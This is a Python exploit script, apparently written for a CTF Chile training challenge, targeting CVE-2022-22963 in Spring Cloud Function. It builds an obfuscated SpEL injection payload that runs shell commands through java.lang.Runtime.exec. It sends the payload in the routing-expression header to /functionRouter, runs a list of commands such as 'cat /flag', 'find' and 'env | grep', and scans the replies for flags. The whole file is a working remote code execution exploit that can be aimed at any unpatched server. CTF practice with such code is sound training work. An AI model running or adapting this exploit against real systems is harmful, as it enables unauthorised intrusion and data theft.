#!/usr/bin/env python3
"""
CTF Chile - PRUEBA RÁPIDA CVE-2022-22963 NUEVA INSTANCIA
"""
import requests
import re

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

print("💥 PRUEBA RÁPIDA CVE-2022-22963")
print("=" * 40)

def build_payload(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    return payload

def search_flags(text):
    flag_patterns = [r'CTF\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}']
    for pattern in flag_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            return matches[0]
    return None

# Comandos rápidos para buscar flags
commands = [
    ("cat /flag", "Flag en raíz"),
    ("find / -name '*flag*' 2>/dev/null | head -3", "Buscar archivos flag"),
    ("env | grep -i flag", "Variables con flag"),
    ("grep -r 'CTF' / 2>/dev/null | head -2", "Buscar CTF en sistema"),
    ("cat /app/flag.txt", "Flag en app"),
    ("whoami", "Usuario actual"),
    ("pwd", "Directorio actual"),
    ("ls -la", "Listar archivos")
]

for cmd, desc in commands:
    print(f"\n🔍 {desc}: {cmd}")
    payload = build_payload(cmd)

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=10)

        print(f"   Status: {r.status_code}")

        if len(r.text) > 10:
            print(f"   Respuesta: {r.text[:200]}...")

            flag = search_flags(r.text)
            if flag:
                print(f"   🏆 FLAG ENCONTRADA: {flag}")

    except Exception as e:
        print(f"   Error: {e}")

print("=" * 40)